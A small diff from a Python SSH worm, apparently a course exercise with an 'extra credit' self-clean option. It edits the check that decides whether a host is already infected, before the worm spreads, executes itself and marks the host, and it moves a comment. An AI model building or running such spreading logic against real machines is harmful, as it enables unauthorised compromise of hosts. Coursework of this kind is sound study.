@@ -170,20 +170,21 @@ if len(sys.argv) < 3:
 			print("Now trying to spread ...")
 			print("Checking if the system already infected ...")
 
-			if isInfectedSystem(ssh_info[0]) == True:
+			if isInfectedSystem(ssh_info[0]) == 0:
 				print("No need to spread the worm.")
 			else:
 				spreadAndExecute(ssh_info[0])
 				markInfected(ssh_info[0])
 				print("Spreading Complete!")
-
+			
+			#--------------------------
+			# Exrea-Credit 1: self-clean the worm program from the hosts
 			try:	
 				if (sys.argv[1] == "-c" or sys.argv[1] == "--clean"):
 					print("************* CLEANING THE HOST (" + host +") *************")
 					clean(ssh_info[0])
 			except IndexError:
 				print("no argument provided --> no cleaning")
-	#--------------------------
-	# Exrea-Credit 1: self-clean the worm program from the hosts
+
 
 
